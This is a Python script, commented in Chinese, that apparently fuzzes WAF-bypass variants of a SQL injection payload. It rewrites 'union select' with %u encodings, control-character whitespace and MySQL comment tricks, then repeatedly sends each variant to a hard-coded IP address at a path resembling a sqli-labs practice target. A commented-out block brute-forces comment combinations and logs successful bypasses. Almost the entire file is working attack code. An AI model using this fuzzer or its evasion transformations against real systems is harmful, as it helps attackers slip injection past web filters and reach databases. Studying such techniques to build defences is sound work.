# ! -*- encoding:utf-8 -*-

# python3
#比较全
# fuzz_zs = ['/*','*/','/*!','?','*','=','`','~','!','@','%','.','-','+','|','%00'.'%20' ,'%09', '%0a', '%0b', '%0c', '%0d' ,
# '%a0' ,'/**/']
# # fuzz_sz = ['0','1','2','3','4','5','6','7','8','9']
# fuzz_ch = ["%0a","%0b","%0c","%0d","%0e","%0f","%0g","%0h","%0i","%0j","%0k","%0l","%0m","%0n",
# "%0o","%0p","%0q","%0r","%0s","%0t","%0u","%0v","%0w","%0x","%0y","%0z"]

import requests
import random
import time
#精简
#空白字符
fuzz_kb =['%01' "%02","%03","%04","%05","%06","%07","%08","%09","%0A","%0B","%0C","%0D","%0E","%0F","%10","%11","%12","%13","%14","%15","%16",
"%17","%18","%19","%1A","%1B","%1C","%1D","%1E","%1F","%20" ]


#注释符

fuzz_zs1=["/**/", "/*!*/", "/*!safe6*/", "+"]


    

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0"}

url_start = "http://106.52.221.73/Less-2/?id=1 "

def bypass(payload):
    v = random.choice(fuzz_kb)
    payload = payload.replace(" ", random.choice(fuzz_zs1))

    payload = payload.replace("=", v + "=" + v)

    payload = payload.replace("AND", v + "AND" + v)

    payload = payload.replace("and", v + "AND" + v)

    payload = payload.replace("WHERE", v + "WHERE" + v)

    payload = payload.replace("where", v + "where" + v)

    payload = payload.replace("UNION", "u%u006eion")

    payload = payload.replace("union", "u%u006eion")

    payload = payload.replace("CHAR", "%u0063har")

    payload = payload.replace("char", "%u0063har")

    payload = payload.replace("SELECT", "se%u006cect")

    payload = payload.replace("select", "se%u006cect")

    payload = payload.replace("FROM", "%u0066rom")

    payload = payload.replace("from", "%u0066rom")

    payload = payload.replace("(", "+(")

    payload = payload.replace(".", ".+")

    payload = payload.replace("--", "/*!*/--")

    url = url_start+payload

    res = requests.get(url=url, headers=headers)

    if "1" in res.text:
        print("Find Fuzz bypass:" + url)



    


# for a in fuzz:

#     for b in fuzz:

#         for c in fuzz:

#             for d in fuzz:

#                 exp = "/*!union" + a + b + c + d + "select*/ 1,2,3"

#                 url = url_start + exp

#                 res = requests.get(url=url, headers=headers)

#                 print("Now URL:" + url)

#                 if "Login" in res.text:
#                     print("Find Fuzz bypass:" + url)

#                     with open("D:ip.txt", 'a', encoding='utf-8') as r:
#                         r.write(url + "\n")

if __name__ == '__main__':

    while True:
        payload="union select 1,2,3"

        bypass(payload)

        time.sleep(0.3)

    
    


       
    